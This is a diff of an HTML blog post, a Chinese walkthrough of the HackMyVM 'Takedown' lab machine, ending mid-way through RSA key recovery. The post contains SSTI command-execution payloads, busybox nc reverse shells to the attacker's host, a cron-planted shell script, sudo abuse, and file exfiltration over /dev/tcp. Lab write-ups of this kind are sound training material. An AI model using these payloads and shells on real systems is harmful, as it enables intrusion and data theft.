@@ -319,7 +319,7 @@ linpeas.sh           100% |*****************************************************
 <meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm%20Takedown-ce-shi-ji-lu.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>hackmyvm Takedown测试记录</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -390,104 +390,97 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=Takedown
 </code></pre>
-<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️⭐️⭐️
-知识点：信息收集，目录扫描，SSTI，`linpeas.sh`脚本，`RSA`工具及密钥处理脚本，`Contempt`提权
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️⭐️
+知识点：信息收集，目录扫描，SSTI，<span class="pl-s"><span class="pl-pds">`</span>linpeas.sh<span class="pl-pds">`</span></span>脚本，<span class="pl-s"><span class="pl-pds">`</span>RSA<span class="pl-pds">`</span></span>工具及密钥处理脚本，<span class="pl-s"><span class="pl-pds">`</span>Contempt<span class="pl-pds">`</span></span>提权</pre></div>
 <h3>2. 信息收集</h3>
 <h5>Nmap</h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
 192.168.31.116  08:00:27:b1:55:96       PCS Systemtechnik GmbH
-└─# IP=192.168.31.116
-└─# nmap -sV -sC -A $IP -Pn
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.116</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 09:12 CST
-Nmap scan report for osiris (192.168.31.116)
+Nmap scan report <span class="pl-k">for</span> osiris (192.168.31.116)
 Host is up (0.0018s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
-| ssh-hostkey:
-|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
-|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
-|_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
+<span class="pl-k">|</span>   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
+<span class="pl-k">|</span>_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
 80/tcp open  http    nginx 1.18.0
-|_http-title: Did not follow redirect to http://shieldweb.che/
-|_http-server-header: nginx/1.18.0
-MAC Address: 08:00:27:B1:55:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-</code></pre>
+<span class="pl-k">|</span>_http-title: Did not follow redirect to http://shieldweb.che/
+<span class="pl-k">|</span>_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:B1:55:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
 <p>开放了<code class="notranslate">22、80</code>端口,先常规扫一下目录</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
-└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
-
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+</pre></div>
 <p>访问<code class="notranslate">80</code>端口无内容，直接访问有个301跳转 <code class="notranslate">http://shieldweb.che/</code> ,加入域名到<code class="notranslate">/etc/hosts</code>,进入页面<code class="notranslate">http://shieldweb.che/</code>，点击<code class="notranslate">Contact</code>按钮又跳转了<code class="notranslate">http://ticket.shieldweb.che/</code>,继续加入域名到<code class="notranslate">/etc/hosts</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl  http://$IP -v
-*   Trying 192.168.31.116:80...
-* Connected to 192.168.31.116 (192.168.31.116) port 80
-* using HTTP/1.x
-&gt; GET / HTTP/1.1
-&gt; Host: 192.168.31.116
-&gt; User-Agent: curl/8.11.0
-&gt; Accept: */*
-&gt;
-* Request completely sent off
-&lt; HTTP/1.1 301 Moved Permanently
-&lt; Server: nginx/1.18.0
-&lt; Date: Sat, 09 Aug 2025 01:22:39 GMT
-&lt; Content-Type: text/html
-&lt; Content-Length: 169
-&lt; Connection: keep-alive
-&lt; Location: http://shieldweb.che/
-&lt;
-&lt;html&gt;
-&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
-&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-* Connection #0 to host 192.168.31.116 left intact
-└─# cat /etc/hosts | grep .che
-192.168.31.116  shieldweb.che ticket.shieldweb.che
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl  http://$IP -v</span>
+<span class="pl-k">*</span>   Trying 192.168.31.116:80...
+<span class="pl-k">*</span> Connected to 192.168.31.116 (192.168.31.116) port 80
+<span class="pl-k">*</span> using HTTP/1.x
+<span class="pl-k">&gt;</span> GET / HTTP/1.1
+<span class="pl-k">&gt;</span> Host: 192.168.31.116
+<span class="pl-k">&gt;</span> User-Agent: curl/8.11.0
+<span class="pl-k">&gt;</span> Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span>
+<span class="pl-k">&gt;</span>
+<span class="pl-k">*</span> Request completely sent off
+<span class="pl-k">&lt;</span> HTTP/1.1 301 Moved Permanently
+<span class="pl-k">&lt;</span> Server: nginx/1.18.0
+<span class="pl-k">&lt;</span> Date: Sat, 09 Aug 2025 01:22:39 GMT
+<span class="pl-k">&lt;</span> Content-Type: text/html
+<span class="pl-k">&lt;</span> Content-Length: 169
+<span class="pl-k">&lt;</span> Connection: keep-alive
+<span class="pl-k">&lt;</span> Location: http://shieldweb.che/
+<span class="pl-k">&lt;</span>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head&gt;&lt;title<span class="pl-k">&gt;</span>301 Moved Permanently<span class="pl-k">&lt;</span>/title&gt;&lt;/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>center&gt;&lt;h<span class="pl-k">1&gt;</span>301 Moved Permanently<span class="pl-k">&lt;</span>/h1&gt;&lt;/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>hr&gt;&lt;center<span class="pl-k">&gt;</span>nginx/1.18.<span class="pl-k">0&lt;</span>/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+<span class="pl-k">*</span> Connection <span class="pl-c"><span class="pl-c">#</span>0 to host 192.168.31.116 left intact</span>
+└─<span class="pl-c"><span class="pl-c">#</span> cat /etc/hosts | grep .che</span>
+192.168.31.116  shieldweb.che ticket.shieldweb.che</pre></div>
 <h3>3.获得<code class="notranslate">docker</code>权限</h3>
 <p>测试<code class="notranslate">Contact</code>页面存在<code class="notranslate">SSTI</code>模板注入</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/10c458211eea2e4f7cca10cf40b5bc8509bf2ca099e8759eec5be21d5fa8b991/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393130313433363931392e706e67"><img src="https://camo.githubusercontent.com/10c458211eea2e4f7cca10cf40b5bc8509bf2ca099e8759eec5be21d5fa8b991/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393130313433363931392e706e67" alt="image-20250809101436919" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250809101436919.png" style="max-width: 100%;"></a></p>
 <p>去<code class="notranslate">github</code>找个现成方案测试<code class="notranslate">PayloadsAllTheThings /Server Side Template Injection/Python.md</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) !
-#注意，没得bash，用ash
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.31.126 1234 -e /bin/ash').read() }}
-└─# nc -lvp 1234
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</span>
+{{ <span class="pl-en">self.__init__.__globals__.__builtins__.__import__('os').popen('id').read</span>() }}
+Thank you <span class="pl-k">for</span> your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) <span class="pl-k">!</span>
+<span class="pl-c"><span class="pl-c">#</span>注意，没得bash，用ash</span>
+{{ self.__init__.__globals__.__builtins__.__import__(<span class="pl-s"><span class="pl-pds">'</span>os<span class="pl-pds">'</span></span>).popen(<span class="pl-s"><span class="pl-pds">'</span>busybox nc 192.168.31.126 1234 -e /bin/ash<span class="pl-pds">'</span></span>).read() }}
+└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234</span>
 listening on [any] 1234 ...
 id
 connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 52914
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-</code></pre>
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
 <p>美化一下终端，受限于<code class="notranslate">doker</code>环境，这里使用<code class="notranslate">Python</code>的<code class="notranslate">pty</code>模块生成一个伪终端，而不能直接用系统自带的工具<code class="notranslate">script</code>升级终端</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#1.把反弹shell变成交互式，在接受回弹的nc -lvp 4444终端上执行
-python -c 'import pty; pty.spawn("/bin/ash")'
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>1.把反弹shell变成交互式，在接受回弹的nc -lvp 4444终端上执行</span>
+python -c <span class="pl-s"><span class="pl-pds">'</span>import pty; pty.spawn("/bin/ash")<span class="pl-pds">'</span></span>
 先ctrl + Z 中断再输入
-#2.交互式shell变成支持回退字符的shell（支持控制字符）
-stty raw -echo;fg
-#reset，这一条弄了当前终端只能强制关闭
-#xterm#根据默认xterm查询，命令echo  $SHELL、echo  $TERM
+<span class="pl-c"><span class="pl-c">#</span>2.交互式shell变成支持回退字符的shell（支持控制字符）</span>
+stty raw -echo<span class="pl-k">;</span><span class="pl-c1">fg</span>
+<span class="pl-c"><span class="pl-c">#</span>reset，这一条弄了当前终端只能强制关闭</span>
+<span class="pl-c"><span class="pl-c">#</span>xterm#根据默认xterm查询，命令echo  $SHELL、echo  $TERM</span>
 3.终端vi可全屏编辑，解决输入问题
 stty -a#查询当前尺寸
-stty rows 24 columns 120#根据上面查询结果，设置为当前窗口大小
-</code></pre>
+stty rows 24 columns 120#根据上面查询结果，设置为当前窗口大小</pre></div>
 <h3>4.获得<code class="notranslate">love</code>权限</h3>
 <p>没扒拉到东西，先取个<code class="notranslate">linpeas.sh</code>脚本扫一下</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">kali└─# python3 -m http.server 80
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> python3 -m http.server 80</span>
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.31.116 - - [09/Aug/2025 10:48:03] "GET /linpeas.sh HTTP/1.1" 200 -
+192.168.31.116 - - [09/Aug/2025 10:48:03] <span class="pl-s"><span class="pl-pds">"</span>GET /linpeas.sh HTTP/1.1<span class="pl-pds">"</span></span> 200 -
 
-/tmp # wget 192.168.31.126/linpeas.sh
+/tmp <span class="pl-c"><span class="pl-c">#</span> wget 192.168.31.126/linpeas.sh</span>
 Connecting to 192.168.31.126 (192.168.31.126:80)
-linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
-/tmp # chmod +x linpeas.sh
-/tmp # ./linpeas.sh
-</code></pre>
+linpeas.sh           100% <span class="pl-k">|</span><span class="pl-k">************************************************************************</span><span class="pl-k">|</span>  808k  0:00:00 ETA
+/tmp <span class="pl-c"><span class="pl-c">#</span> chmod +x linpeas.sh</span>
+/tmp <span class="pl-c"><span class="pl-c">#</span> ./linpeas.sh</span></pre></div>
 <p>通过<code class="notranslate">linpeas.sh</code>脚本发现可疑目录挂载：将<code class="notranslate">/love/script</code>目录挂载到了<code class="notranslate">/script</code>（看群主的WP才知道）</p>
 <pre class="notranslate"><code class="notranslate">╔══════════╣ Interesting Files Mounted
 239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
@@ -502,14 +495,14 @@ linpeas.sh           100% |*****************************************************
 
 </code></pre>
 <p>结合<code class="notranslate">/var/log</code>下<code class="notranslate">access.yml、chat</code>中内容，知道每<code class="notranslate">5分钟</code>执行了<code class="notranslate">cron</code>任务，任务路径是<code class="notranslate">/home/love/script</code>，前面已知<code class="notranslate">/love/script</code>目录被挂载到了<code class="notranslate">/script</code>。</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">/var/log # ls
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/log <span class="pl-c"><span class="pl-c">#</span> ls</span>
 access.yml  chat
-/var/log # cat chat
+/var/log <span class="pl-c"><span class="pl-c">#</span> cat chat</span>
 Kevin: Love be careful what you do.
-A.love: I don't know Kevin, it's just a moment.
+A.love: I don<span class="pl-s"><span class="pl-pds">'</span>t know Kevin, it<span class="pl-pds">'</span></span>s just a moment.
 Kevin: Remove that now.
 A.Love: Go to.
-/var/log # cat access.yml
+/var/log <span class="pl-c"><span class="pl-c">#</span> cat access.yml</span>
 2023-08-31 10:15:42 - Usuario: jsmith - Accion: Inicio de sesion exitoso
 2023-08-31 11:20:18 - Usuario: a_doe - Accion: Acceso a la carpeta /datos/confidenciales
 2023-08-31 12:45:29 - Usuario: s_miller - Accion: Intento de acceso no autorizado
@@ -522,24 +515,22 @@ A.Love: Go to.
 2023-08-31 20:15:17 - Usuario: m_johnson - Accion: Cambio de contrasena exitoso
 2023-08-31 21:30:59 - Usuario: k_adams - Accion: Descarga de archivo confidencial_backup.zip
 
-2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
-/var/log #
+2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: <span class="pl-k">*</span>/5 <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> root bash /home/love/script/<span class="pl-k">*</span>
+/var/log <span class="pl-c"><span class="pl-c">#</span></span>
 
 239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
-240 231 8:1
-</code></pre>
+240 231 8:1</pre></div>
 <p>去挂载目录<code class="notranslate">/script</code>写个脚本，再等定时任务触发后即可获得shell</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">/var/log # cd /script/
-/script # echo 'busybox nc 192.168.31.126 1235 -e /bin/bash' &gt; a.sh
-/script # chmod +x a.sh
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/log <span class="pl-c"><span class="pl-c">#</span> cd /script/</span>
+/script <span class="pl-c"><span class="pl-c">#</span> echo 'busybox nc 192.168.31.126 1235 -e /bin/bash' &gt; a.sh</span>
+/script <span class="pl-c"><span class="pl-c">#</span> chmod +x a.sh</span>
 
-kali└─# nc -lvp 1235
+kali└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1235</span>
 listening on [any] 1235 ...
 id
 connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 39518
 uid=1002(love) gid=1002(love) grupos=1002(love)
-
-</code></pre>
+</pre></div>
 <p>方便登陆写个公钥</p>
 <pre class="notranslate"><code class="notranslate">#kali生成公私钥
 ssh-keygen -t ed25519
@@ -549,9 +540,9 @@ echo '&lt;公钥&gt;'&gt;&gt;~/.ssh/authorized_key
 </code></pre>
 <h3>5.获得<code class="notranslate">mitnick</code>权限</h3>
 <p>家目录下有四个账户<code class="notranslate">alfonso、love、mitnick、tomu</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">love@osiris:~$ ls
+<div class="highlight highlight-source-shell"><pre class="notranslate">love@osiris:<span class="pl-k">~</span>$ ls
 note.txt
-love@osiris:~$ cat note.txt
+love@osiris:<span class="pl-k">~</span>$ cat note.txt
 A.love:
 
 Kevin this is a good icebreaker
@@ -561,27 +552,26 @@ we have icebreaker
 jajajajjaja
 
 S.A.S.
-love@osiris:~$ cat /etc/passwd
+love@osiris:<span class="pl-k">~</span>$ cat /etc/passwd
 root:x:0:0:root:/root:/usr/bin/sh
 ......
 tomu:x:1001:1001:Tsutomu Shimomura,,,:/home/tomu:/bin/bash
 love:x:1002:1002:Alex Love,,,:/home/love:/bin/bash
 mitnick:x:1003:1003:,,,:/home/mitnick:/bin/bash
-love@osiris:/home$ alias ll='ls -artl'
+love@osiris:/home$ <span class="pl-c1">alias</span> ll=<span class="pl-s"><span class="pl-pds">'</span>ls -artl<span class="pl-pds">'</span></span>
 love@osiris:/home$ ll
 total 24
 drwxr-xr-x 18 root    root    4096 jul  9  2023 ..
-drwxr-xr-x  6 root    root    4096 ago 31  2023 .
+drwxr-xr-x  6 root    root    4096 ago 31  2023 <span class="pl-c1">.</span>
 drwxr-xr-x  7 alfonso alfonso 4096 oct  9  2023 alfonso
 drwxr-xr-x  4 tomu    tomu    4096 jun  2  2024 tomu
 drwxr-xr-x  4 mitnick mitnick 4096 jun 28 19:12 mitnick
 drwxr-xr-x  4 love    love    4096 ago  9 05:13 love
-
-</code></pre>
+</pre></div>
 <p><code class="notranslate">sudo -l</code>可以mitnick权限执行<code class="notranslate">home/mitnick/sas</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">ove@osiris:/home/mitnick$ sudo -l
-Matching Defaults entries for love on osiris:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<div class="highlight highlight-source-shell"><pre class="notranslate">ove@osiris:/home/mitnick$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> love on osiris:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User love may run the following commands on osiris:
     (mitnick) NOPASSWD: /home/mitnick/sas
@@ -590,56 +580,54 @@ love@osiris:/home/mitnick$ sudo -u mitnick /home/mitnick/sas
  S     S          A   A           S     S
  S               A     A          S
   SSSSS          A     A           SSSSS
-       S   ###   AAAAAAA    ###         S
- S     S   ###   A     A    ###   S     S
+       S   <span class="pl-c"><span class="pl-c">#</span>##   AAAAAAA    ###         S</span>
+ S     S   <span class="pl-c"><span class="pl-c">#</span>##   A     A    ###   S     S</span>
   SSSSS          A     A           SSSSS
 SAS v1.0
 (c) SWITCHED ACCESS SERVICES 2023 Aquilino Morcillo
 
 sas -h Available commands
-# id
+<span class="pl-c"><span class="pl-c">#</span> id</span>
 Command not found: id
-# sas -h
+<span class="pl-c"><span class="pl-c">#</span> sas -h</span>
 Available commands:
 sas_call - listen to Services
 ls - List files and directories
-cat &lt;filename&gt; - Display contents of a file
+cat <span class="pl-k">&lt;</span>filename<span class="pl-k">&gt;</span> - Display contents of a file
 whoami - Show current user
-sas help (-h) - Show available commands
+sas <span class="pl-c1">help</span> (-h) - Show available commands
 version (-v) - Show application version
-run &lt;filename&gt; - Execute a file
-dir - Show the content of the current directory in wide format
-</code></pre>
+run <span class="pl-k">&lt;</span>filename<span class="pl-k">&gt;</span> - Execute a file
+dir - Show the content of the current directory <span class="pl-k">in</span> wide format</pre></div>
 <p>可以运行脚本，继续反弹个<code class="notranslate">shell</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">love@osiris:~$ cat /home/love/a.sh
+<div class="highlight highlight-source-shell"><pre class="notranslate">love@osiris:<span class="pl-k">~</span>$ cat /home/love/a.sh
 busybox nc 192.168.31.126 1235 -e /bin/bash
-love@osiris:~$
-love@osiris:~$ sudo -l
-Matching Defaults entries for love on osiris:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+love@osiris:<span class="pl-k">~</span>$
+love@osiris:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> love on osiris:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User love may run the following commands on osiris:
     (mitnick) NOPASSWD: /home/mitnick/sas
-love@osiris:~$ sudo -u mitnick /home/mitnick/sas
+love@osiris:<span class="pl-k">~</span>$ sudo -u mitnick /home/mitnick/sas
   SSSSS            AAA             SSSSS
  S     S          A   A           S     S
  S               A     A          S
   SSSSS          A     A           SSSSS
-       S   ###   AAAAAAA    ###         S
- S     S   ###   A     A    ###   S     S
+       S   <span class="pl-c"><span class="pl-c">#</span>##   AAAAAAA    ###         S</span>
+ S     S   <span class="pl-c"><span class="pl-c">#</span>##   A     A    ###   S     S</span>
   SSSSS          A     A           SSSSS
 SAS v1.0
 (c) SWITCHED ACCESS SERVICES 2023 Aquilino Morcillo
 
 sas -h Available commands
-# run /home/love/a.sh
+<span class="pl-c"><span class="pl-c">#</span> run /home/love/a.sh</span>
 
-kali└─# nc -lvp 1235
+kali└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1235</span>
 listening on [any] 1235 ...
 id
 connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 49780
-uid=1003(mitnick) gid=1003(mitnick) grupos=1003(mitnick)
-</code></pre>
+uid=1003(mitnick) gid=1003(mitnick) grupos=1003(mitnick)</pre></div>
 <p>在<code class="notranslate">/home/mitnick</code>目录下发现<code class="notranslate">publickey.pub、secret.enc</code>，大概率是通过公钥去解密<code class="notranslate">enc</code>，其实<code class="notranslate">mitnick</code>家目录的文件<code class="notranslate">love</code>账户可以读，直接操作就行了</p>
 <pre class="notranslate"><code class="notranslate">love@osiris:/home/mitnick$ ls
 publickey.pub  sas  secret.enc
@@ -658,158 +646,146 @@ drwx------ 2 mitnick mitnick    4096 sep  1  2023 .ssh
 drwxr-xr-x 4 mitnick mitnick    4096 jun 28 19:12 .
 </code></pre>
 <p>先把文件取到本地</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">love@osiris:/home/mitnick$ cat publickey.pub &gt; /dev/tcp/192.168.31.126/1234
-love@osiris:/home/mitnick$ cat secret.enc &gt; /dev/tcp/192.168.31.126/1234
+<div class="highlight highlight-source-shell"><pre class="notranslate">love@osiris:/home/mitnick$ cat publickey.pub <span class="pl-k">&gt;</span> /dev/tcp/192.168.31.126/1234
+love@osiris:/home/mitnick$ cat secret.enc <span class="pl-k">&gt;</span> /dev/tcp/192.168.31.126/1234
 
-kali└─# nc -lvp 1234&gt;publickey.pub
-kali└─# nc -lvp 1234&gt;secret.enc
+kali└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234&gt;publickey.pub</span>
+kali└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234&gt;secret.enc</span>
 listening on [any] 1234 ...
-connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 35344
-</code></pre>
+connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 35344</pre></div>
 <h3>6.获得<code class="notranslate">tomu</code>权限</h3>
 <h5>RSA解密</h5>
 <p>关于RSA的基础知识推荐看B站<code class="notranslate">风二西</code>师傅的成套[<a href="https://www.bilibili.com/video/BV1Dw411f7Ht" rel="nofollow">视频</a>](<a href="https://www.bilibili.com/video/BV1Dw411f7Ht" rel="nofollow">https://www.bilibili.com/video/BV1Dw411f7Ht</a>)</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#风二西
-https://www.bilibili.com/video/BV1Dw411f7Ht
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>风二西</span>
+https://www.bilibili.com/video/BV1Dw411f7Ht</pre></div>
 <p>通过公钥获取<code class="notranslate">n,e</code>参数，再去<a href="http://factordb.com/%E5%88%86%E8%A7%A3%60n%60%E8%8E%B7%E5%BE%97%60p,q%60" rel="nofollow">http://factordb.com/分解`n`获得`p,q`</a></p>
-<pre lang="python" class="notranslate"><code class="notranslate">from Crypto.PublicKey import RSA
-import libnum
-with open("publickey.pub", 'rb') as f:
-    key = f.read()
-rsakey = RSA.importKey(key)
-n= rsakey.n
-e= rsakey.e
-print(n)
-print(e)
-e= rsakey.e
-#http://factordb.com/分解n
-p=272799705830086927219936172916283678397
-q=335234831001780341003153415948249295589
-</code></pre>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">PublicKey</span> <span class="pl-k">import</span> <span class="pl-c1">RSA</span>
+<span class="pl-k">import</span> <span class="pl-s1">libnum</span>
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s">"publickey.pub"</span>, <span class="pl-s">'rb'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+    <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">f</span>.<span class="pl-c1">read</span>()
+<span class="pl-s1">rsakey</span> <span class="pl-c1">=</span> <span class="pl-c1">RSA</span>.<span class="pl-c1">importKey</span>(<span class="pl-s1">key</span>)
+<span class="pl-s1">n</span><span class="pl-c1">=</span> <span class="pl-s1">rsakey</span>.<span class="pl-c1">n</span>
+<span class="pl-s1">e</span><span class="pl-c1">=</span> <span class="pl-s1">rsakey</span>.<span class="pl-c1">e</span>
+<span class="pl-en">print</span>(<span class="pl-s1">n</span>)
+<span class="pl-en">print</span>(<span class="pl-s1">e</span>)
+<span class="pl-s1">e</span><span class="pl-c1">=</span> <span class="pl-s1">rsakey</span>.<span class="pl-c1">e</span>
+<span class="pl-c">#http://factordb.com/分解n</span>
+<span class="pl-s1">p</span><span class="pl-c1">=</span><span class="pl-c1">272799705830086927219936172916283678397</span>
+<span class="pl-s1">q</span><span class="pl-c1">=</span><span class="pl-c1">335234831001780341003153415948249295589</span></pre></div>
 <p>通过已知的<code class="notranslate">p,q,e</code>获得私钥</p>
-<pre lang="python" class="notranslate"><code class="notranslate">from Crypto.PublicKey import RSA
-import libnum
-import gmpy2
-p=272799705830086927219936172916283678397
-q=335234831001780341003153415948249295589
-n=p*q
-e=65537
-phi_n=(p-1)*(q-1)
-#求逆元
-d=libnum.invmod(e,phi_n)
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">PublicKey</span> <span class="pl-k">import</span> <span class="pl-c1">RSA</span>
+<span class="pl-k">import</span> <span class="pl-s1">libnum</span>
+<span class="pl-k">import</span> <span class="pl-s1">gmpy2</span>
+<span class="pl-s1">p</span><span class="pl-c1">=</span><span class="pl-c1">272799705830086927219936172916283678397</span>
+<span class="pl-s1">q</span><span class="pl-c1">=</span><span class="pl-c1">335234831001780341003153415948249295589</span>
+<span class="pl-s1">n</span><span class="pl-c1">=</span><span class="pl-s1">p</span><span class="pl-c1">*</span><span class="pl-s1">q</span>
+<span class="pl-s1">e</span><span class="pl-c1">=</span><span class="pl-c1">65537</span>
+<span class="pl-s1">phi_n</span><span class="pl-c1">=</span>(<span class="pl-s1">p</span><span class="pl-c1">-</span><span class="pl-c1">1</span>)<span class="pl-c1">*</span>(<span class="pl-s1">q</span><span class="pl-c1">-</span><span class="pl-c1">1</span>)
+<span class="pl-c">#求逆元</span>
+<span class="pl-s1">d</span><span class="pl-c1">=</span><span class="pl-s1">libnum</span>.<span class="pl-c1">invmod</span>(<span class="pl-s1">e</span>,<span class="pl-s1">phi_n</span>)
